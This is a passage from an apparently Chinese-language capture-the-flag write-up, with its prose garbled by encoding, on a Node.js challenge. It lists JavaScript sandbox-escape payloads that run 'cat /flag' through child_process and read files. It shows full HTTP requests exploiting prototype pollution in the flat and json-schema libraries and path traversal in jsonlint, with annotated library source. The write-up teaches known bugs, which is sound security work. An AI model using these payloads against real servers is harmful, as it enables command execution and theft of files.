corrupted"}</span><br></pre></td></tr></tbody></table></figure><p></p><p>åé¢çš„å°±æ˜¯åŸºæœ¬æ˜¯åŸºäº post body çš„å˜å½¢äº†ï¼š</p><ul><li><code>["const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /f'+'l'+'a'+'g').toString()"]</code></li><li><code>["const p = this.constructor.constructor('return this.process')(); p.mainModule.require('fs').readFileSync('/f'+'l'+'a'+'g').toString()"]</code></li><li><code>["p = this.constructor.constructor(\"return process\")(); r = p.mainModule.require; fs = r(\"fs\"); throw new Error(fs.readFileSync(\"/flag\").toString())"]</code></li><li><code>["var process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /f'+'l'+'a'+'g').toString()"]</code></li><li><code>["p = this.constructor.constructor(\"return process\")(); r = p.mainModule.require; fs = r(\"fs\"); fs.readFileSync(\"/flag\").toString()"]</code></li><li><code>["const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /f'+'l'+'a'+'g').toString()"]</code></li><li><code>["const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /f'+'l'+'a'+'g').toString()"]</code></li><li><code>["var process = this.constructor.constructor(\"return process\")(); p.mainModule.require('child_process').execSync('cat /f'+'l'+'a'+'g').toString()"]</code></li><li><code>["this.constructor.constructor('return process')().mainModule.require('fs').readFileSync('/f'+'l'+'a'+'g')+[]"]</code></li><li><code>["this.constructor.constructor('return process')().mainModule.require('child_process').execSync('cat /f*')+[]"]</code></li><li><code>["const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('cat /*g').toString()"]</code></li></ul><h3 id="flat"><a href="#flat" class="headerlink" title="flat"></a>flat</h3><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/config/validated/flat/unflatten</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: zedd.vv:4017</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 29</span><br><span class="line"></span><br><span class="line">{"__proto__.path": "/flag"}</span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="hljs-number">200</span> OK</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/json; charset=utf-8</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 35</span><br><span class="line"><span class="hljs-attribute">ETag</span>: W/"23-RVcPh+LK1Ac7n2mAq1KjFd049Xo"</span><br><span class="line"><span class="hljs-attribute">Date</span>: Tue, 13 Oct 2020 16:54:07 GMT</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">{"validator":{},"data":"000AAAA\n"}</span><br></pre></td></tr></tbody></table></figure><p></p><p>è¿™ä¸ªå…¶å®æ˜¯ 7/18 @po6ix æå‡ºäº† flat lib ä¸­çš„ <code>unflatten</code>  å­˜åœ¨åŸå‹é“¾æ±¡æŸ“ï¼š<a href="https://github.com/hughsk/flat/issues/105" target="_blank" rel="noopener">https://github.com/hughsk/flat/issues/105</a></p><p>ç®€å• debug è·Ÿäº†ä¸€ä¸‹ï¼Œç®€åŒ–äº†ä¸€ä¸‹åŸå‡½æ•°ä»£ç ï¼š</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unflatten</span> (<span class="hljs-params">target, opts</span>) </span>{</span><br><span class="line">  opts = opts || {}</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">const</span> delimiter = opts.delimiter || <span class="hljs-string">'.'</span></span><br><span class="line">  <span class="hljs-keyword">const</span> overwrite = opts.overwrite || <span class="hljs-literal">false</span></span><br><span class="line">  <span class="hljs-keyword">const</span> transformKey = opts.transformKey || keyIdentity</span><br><span class="line">  <span class="hljs-keyword">const</span> result = {}</span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">//...</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">Object</span>.keys(target).forEach(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">key</span>) </span>{</span><br><span class="line">    <span class="hljs-keyword">const</span> split = key.split(delimiter).map(transformKey)</span><br><span class="line">    <span class="hljs-keyword">let</span> key1 = getkey(split.shift())</span><br><span class="line">    <span class="hljs-keyword">let</span> key2 = getkey(split[<span class="hljs-number">0</span>])</span><br><span class="line">    <span class="hljs-keyword">let</span> recipient = result</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">while</span> (key2 !== <span class="hljs-literal">undefined</span>) {</span><br><span class="line">      <span class="hljs-keyword">const</span> type = <span class="hljs-built_in">Object</span>.prototype.toString.call(recipient[key1])</span><br><span class="line">      <span class="hljs-keyword">const</span> isobject = (</span><br><span class="line">        type === <span class="hljs-string">'[object Object]'</span> ||</span><br><span class="line">        type === <span class="hljs-string">'[object Array]'</span></span><br><span class="line">      )</span><br><span class="line"></span><br><span class="line">      <span class="hljs-comment">// do not write over falsey, non-undefined values if overwrite is false</span></span><br><span class="line">      <span class="hljs-keyword">if</span> (!overwrite &amp;&amp; !isobject &amp;&amp; <span class="hljs-keyword">typeof</span> recipient[key1] !== <span class="hljs-string">'undefined'</span>) {</span><br><span class="line">        <span class="hljs-keyword">return</span></span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      <span class="hljs-keyword">if</span> ((overwrite &amp;&amp; !isobject) || (!overwrite &amp;&amp; recipient[key1] == <span class="hljs-literal">null</span>)) {</span><br><span class="line">        recipient[key1] = (</span><br><span class="line">          <span class="hljs-keyword">typeof</span> key2 === <span class="hljs-string">'number'</span> &amp;&amp;</span><br><span class="line">          !opts.object ? [] : {}</span><br><span class="line">        )</span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      recipient = recipient[key1]</span><br><span class="line">      <span class="hljs-keyword">if</span> (split.length &gt; <span class="hljs-number">0</span>) {</span><br><span class="line">        key1 = getkey(split.shift())</span><br><span class="line">        key2 = getkey(split[<span class="hljs-number">0</span>])</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// unflatten again for 'messy objects'</span></span><br><span class="line">    recipient[key1] = unflatten(target[key], opts)</span><br><span class="line">  })</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> result</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>æˆ‘ä»¬ä¼ å…¥<code>{"__proto__.path": "/flag"}</code> åˆ° <code>target</code> å˜é‡ï¼Œç„¶åç»è¿‡ä¸€äº›åˆ¤æ–­ä»¥åŠæ“ä½œï¼Œç»è¿‡ <code>while</code> ç¬¬ä¸€è½®å¾ªç¯å¾—åˆ°:</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">recipient = recipient[key1]<span class="hljs-comment">//recipient = {}["__proto__"]</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>æ­¤æ—¶ <code>recipient</code> å°±æŒ‡å‘äº† <code>Function.prototype</code> ï¼Œè€Œå¾ªç¯ç»“æŸä¹‹åé€’å½’æ‰§è¡Œ <code>unflatten</code> å‡½æ•°ï¼Œæ­¤æ—¶</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">recipient[key1] = unflatten(target[key], opts) <span class="hljs-comment">// recipient['path'] = unflatten("/flag", {})</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>è€Œå› ä¸ºä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¹Ÿå°±æ˜¯ <code>/flag</code>  ä¸ºå­—ç¬¦ä¸²ï¼Œè¢« <code>unflatten</code> ç›´æ¥è¿”å›ï¼Œä¹Ÿå°±æ˜¯è¯´æœ€ç»ˆç»“æœä¸ºï¼š</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">recipient[key1] = <span class="hljs-string">'/flag'</span><span class="hljs-comment">//recipient['path'] = '/flag'</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>æ•´ä¸ªæµç¨‹å¯ä»¥ç®€åŒ–ä¸ºï¼š</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> obj = {};</span><br><span class="line"><span class="hljs-keyword">var</span> a = {};</span><br><span class="line">obj = obj[<span class="hljs-string">"__proto__"</span>];</span><br><span class="line">obj[<span class="hljs-string">'path'</span>] = <span class="hljs-string">'/flag'</span>;</span><br><span class="line"><span class="hljs-built_in">console</span>.log(obj.path);</span><br><span class="line"><span class="hljs-built_in">console</span>.log(a.path);</span><br></pre></td></tr></tbody></table></figure><p></p><p>è¿™æ ·å°±å®Œæˆäº†åŸå‹é“¾æ±¡æŸ“çš„æ•ˆæœï¼Œæˆ‘ä»¬å°±å¯ä»¥å°† <code>config.path</code> æ±¡æŸ“æˆ flag è·¯å¾„äº†ï¼Œä¹Ÿå°±å¯ä»¥è¯»åˆ° flag äº†</p><p>å­˜åœ¨ä¸€äº›å˜å½¢æ¯”å¦‚ï¼š</p><ul><li>æ›´æ”¹ä¼ è¾“æ–¹å¼ä¸º<code>application/x-www-form-urlencoded</code></li><li>æ›´æ”¹å¼•ç”¨è·¯å¾„<code>POST /config/validated/..%2fnode_modules%2fflat/unflatten HTTP/1.1</code></li></ul><p>é¡ºä¾¿ï¼Œflat å·²ç»ä¿®å¤äº†è¿™ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¿®å¤æ–¹å¼æ˜¯å°†<code>__proto__</code>è®¾ç½®ä¸º <code>key1</code> çš„é»‘åå•ï¼š<a href="https://github.com/hughsk/flat/pull/106/commits/b7815abada29592b0067e391ab215a462a7347e8" target="_blank" rel="noopener">https://github.com/hughsk/flat/pull/106/commits/b7815abada29592b0067e391ab215a462a7347e8</a></p><h3 id="Jsonlint"><a href="#Jsonlint" class="headerlink" title="Jsonlint"></a>Jsonlint</h3><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/config/validated/jsonlint/main</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: zedd.vv:4017</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 33</span><br><span class="line"></span><br><span class="line">{"1":"../../../../../../../flag"}</span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="hljs-number">500</span> Internal Server Error</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: text/html; charset=utf-8</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 1162</span><br><span class="line"><span class="hljs-attribute">ETag</span>: W/"48a-J1p7tUkAXQsyvitsec7yxDGU9yc"</span><br><span class="line"><span class="hljs-attribute">Date</span>: Tue, 13 Oct 2020 16:58:55 GMT</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Parse error on line 1:</span><br><span class="line"><span class="hljs-attribute">000AAAA</span></span><br><span class="line"><span class="hljs-attribute">^</span></span><br><span class="line">Expecting &amp;#39;STRING&amp;#39;, &amp;#39;NUMBER&amp;#39;, &amp;#39;NULL&amp;#39;, &amp;#39;TRUE&amp;#39;, &amp;#39;FALSE&amp;#39;, &amp;#39;{&amp;#39;, &amp;#39;[&amp;#39;, got &amp;#39;undefined&amp;#39;&lt;/h1&gt;</span><br><span class="line">&lt;h2&gt;&lt;/h2&gt;</span><br><span class="line">&lt;pre&gt;Error: Parse error on line 1:</span><br><span class="line"><span class="hljs-attribute">000AAAA</span></span><br><span class="line"><span class="hljs-attribute">^</span></span><br><span class="line">Expecting &amp;#39;STRING&amp;#39;, &amp;#39;NUMBER&amp;#39;, &amp;#39;NULL&amp;#39;, &amp;#39;TRUE&amp;#39;, &amp;#39;FALSE&amp;#39;, &amp;#39;{&amp;#39;, &amp;#39;[&amp;#39;, got &amp;#39;undefined&amp;#39;</span><br><span class="line">    at Object.parseError (/service/node_modules/jsonlint/lib/jsonlint.js:55:11)</span><br><span class="line">    at Object.parse (/service/node_modules/jsonlint/lib/jsonlint.js:132:22)</span><br><span class="line">    at Object.commonjsMain [as main] (/service/node_modules/jsonlint/lib/jsonlint.js:427:27)</span><br><span class="line">    at /service/routes/config.js:22:36</span><br><span class="line">    at Layer.handle [as handle_request] (/service/node_modules/express/lib/router/layer.js:95:5)</span><br><span class="line">    at next (/service/node_modules/express/lib/router/route.js:137:13)</span><br><span class="line">    at Route.dispatch (/service/node_modules/express/lib/router/route.js:112:3)</span><br><span class="line">    at Layer.handle [as handle_request] (/service/node_modules/express/lib/router/layer.js:95:5)</span><br><span class="line">    at /service/node_modules/express/lib/router/index.js:281:22</span><br><span class="line">    at param (/service/node_modules/express/lib/router/index.js:354:14)&lt;/pre&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>è¿™ä¸ªä¹Ÿæ¯”è¾ƒç®€å•ï¼Œjsonlint lib ä¸­æœ‰ä¸€ä¸ª main å‡½æ•°å­˜åœ¨ç›´æ¥å¼•ç”¨æ–‡ä»¶çš„æ“ä½œï¼š</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">exports.main = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">commonjsMain</span>(<span class="hljs-params">args</span>) </span>{</span><br><span class="line">    <span class="hljs-keyword">if</span> (!args[<span class="hljs-number">1</span>])</span><br><span class="line">        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">'Usage: '</span>+args[<span class="hljs-number">0</span>]+<span class="hljs-string">' FILE'</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> process !== <span class="hljs-string">'undefined'</span>) {</span><br><span class="line">        <span class="hljs-keyword">var</span> source = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>).readFileSync(<span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>).join(process.cwd(), args[<span class="hljs-number">1</span>]), <span class="hljs-string">"utf8"</span>);</span><br><span class="line">    } <span class="hljs-keyword">else</span> {</span><br><span class="line">        <span class="hljs-keyword">var</span> cwd = <span class="hljs-built_in">require</span>(<span class="hljs-string">"file"</span>).path(<span class="hljs-built_in">require</span>(<span class="hljs-string">"file"</span>).cwd());</span><br><span class="line">        <span class="hljs-keyword">var</span> source = cwd.join(args[<span class="hljs-number">1</span>]).read({<span class="hljs-attr">charset</span>: <span class="hljs-string">"utf-8"</span>});</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> exports.parser.parse(source);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>è€Œ <code>args</code> åˆ™æ˜¯æˆ‘ä»¬ä¼ å…¥çš„<code>req.body</code>ï¼Œä¹Ÿå°±æ˜¯<code>{"1":"../../../../../../../flag"}</code>ï¼Œç›´æ¥å¼•å…¥ flag æ–‡ä»¶å¯¼è‡´æŠ¥é”™å›æ˜¾å³å¯ã€‚</p><h3 id="json-schema"><a href="#json-schema" class="headerlink" title="json-schema"></a>json-schema</h3><p>è¿™ä¸ªåº“ç®—æ˜¯å®˜æ–¹ç»™çš„ä¸€ä¸ª hint å§ï¼Œå› ä¸ºç®—æ˜¯åœ¨<code>/config/validated</code>è·¯ç”±é»˜è®¤ä½¿ç”¨çš„ lib ï¼Œè€Œä¸”æœäº†ä¸€ä¸‹æ˜¯ä¸€ä¸ªåºŸå¼ƒçš„ä»“åº“ï¼š<a href="https://github.com/kriszyp/json-schema/" target="_blank" rel="noopener">https://github.com/kriszyp/json-schema/</a> ï¼Œè€Œä¸”çœ‹èµ·æ¥è¿˜èƒ½ç®—æ˜¯ä¸€ä¸ª 0day</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{<span class="hljs-attr">"$schema"</span>: {<span class="hljs-attr">"properties"</span>: {<span class="hljs-attr">"__proto__"</span>: {<span class="hljs-attr">"properties"</span>: {<span class="hljs-attr">"path"</span>: {<span class="hljs-attr">"default"</span>: <span class="hljs-string">"/flag"</span>}}}}}}</span><br></pre></td></tr></tbody></table></figure><p></p><p>ç»è¿‡ç®€å•è°ƒè¯•å¯ä»¥å‘ç°ä¸»è¦é—®é¢˜åœ¨ä¸¤ä¸ªå‡½æ•°ï¼š<code>checkObj</code> ä¸ <code>checkProp</code> </p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// validate a value against a property definition</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkProp</span>(<span class="hljs-params">value, schema, path, i</span>) </span>{</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">var</span> l;</span><br><span class="line">  path += path ? <span class="hljs-keyword">typeof</span> i == <span class="hljs-string">'number'</span> ? <span class="hljs-string">'['</span> + i + <span class="hljs-string">']'</span>: <span class="hljs-keyword">typeof</span> i == <span class="hljs-string">'undefined'</span> ? <span class="hljs-string">''</span>: <span class="hljs-string">'.'</span> + i: i;</span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addError</span>(<span class="hljs-params">message</span>) </span>{</span><br><span class="line">    errors.push({</span><br><span class="line">      property: path,</span><br><span class="line">      message: message</span><br><span class="line">    });</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">typeof</span> schema != <span class="hljs-string">'object'</span> || schema <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Array</span>) &amp;&amp; (path || <span class="hljs-keyword">typeof</span> schema != <span class="hljs-string">'function'</span>) &amp;&amp; !(schema &amp;&amp; getType(schema))) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> schema == <span class="hljs-string">'function'</span>) {</span><br><span class="line">      <span class="hljs-keyword">if</span> (! (value <span class="hljs-keyword">instanceof</span> schema)) {</span><br><span class="line">        addError(<span class="hljs-string">"is not an instance of the class/constructor "</span> + schema.name);</span><br><span class="line">      }</span><br><span class="line">    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (schema) {</span><br><span class="line">      addError(<span class="hljs-string">"Invalid schema/property definition "</span> + schema);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> (_changing &amp;&amp; schema.readonly) {</span><br><span class="line">    addError(<span class="hljs-string">"is a readonly field, it can not be changed"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> (schema[<span class="hljs-string">'extends'</span>]) { <span class="hljs-comment">// if it extends another schema, it must pass that schema as well</span></span><br><span class="line">    checkProp(value, schema[<span class="hljs-string">'extends'</span>], path, i);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-comment">// validate a value against a type definition</span></span><br><span class="line">  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkType</span>(<span class="hljs-params">type, value</span>) </span>{</span><br><span class="line">    <span class="hljs-keyword">if</span> (type) {</span><br><span class="line">      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> type == <span class="hljs-string">'string'</span> &amp;&amp; type != <span class="hljs-string">'any'</span> &amp;&amp; (type == <span class="hljs-string">'null'</span> ? value !== <span class="hljs-literal">null</span>: <span class="hljs-keyword">typeof</span> value != type) &amp;&amp; !(value <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Array</span> &amp;&amp; type == <span class="hljs-string">'array'</span>) &amp;&amp; !(value <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Date</span> &amp;&amp; type == <span class="hljs-string">'date'</span>) &amp;&amp; !(type == <span class="hljs-string">'integer'</span> &amp;&amp; value % <span class="hljs-number">1</span> === <span class="hljs-number">0</span>)) {</span><br><span class="line">        <span class="hljs-keyword">return</span> [{</span><br><span class="line">          property: path,</span><br><span class="line">          message: (<span class="hljs-keyword">typeof</span> value) + <span class="hljs-string">" value found, but a "</span> + type + <span class="hljs-string">" is required"</span></span><br><span class="line">        }];</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> (type <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Array</span>) {</span><br><span class="line">        <span class="hljs-keyword">var</span> unionErrors = [];</span><br><span class="line">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j = <span class="hljs-number">0</span>; j &lt; type.length; j++) { <span class="hljs-comment">// a union type</span></span><br><span class="line">          <span class="hljs-keyword">if</span> (! (unionErrors = checkType(type[j], value)).length) {</span><br><span class="line">            <span class="hljs-keyword">break</span>;</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span> (unionErrors.length) {</span><br><span class="line">          <span class="hljs-keyword">return</span> unionErrors;</span><br><span class="line">        }</span><br><span class="line">      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> type == <span class="hljs-string">'object'</span>) {</span><br><span class="line">        <span class="hljs-keyword">var</span> priorErrors = errors;</span><br><span class="line">        errors = [];</span><br><span class="line">        checkProp(value, type, path);</span><br><span class="line">        <span class="hljs-keyword">var</span> theseErrors = errors;</span><br><span class="line">        errors = priorErrors;</span><br><span class="line">        <span class="hljs-keyword">return</span> theseErrors;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> [];</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> (value === <span class="hljs-literal">undefined</span>) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (schema.required) {</span><br><span class="line">      addError(<span class="hljs-string">"is missing and it is required"</span>);</span><br><span class="line">    }</span><br><span class="line">  } <span class="hljs-keyword">else</span> {</span><br><span class="line">    errors = errors.concat(checkType(getType(schema), value));</span><br><span class="line">    <span class="hljs-keyword">if</span> (schema.disallow &amp;&amp; !checkType(schema.disallow, value).length) {</span><br><span class="line">      addError(<span 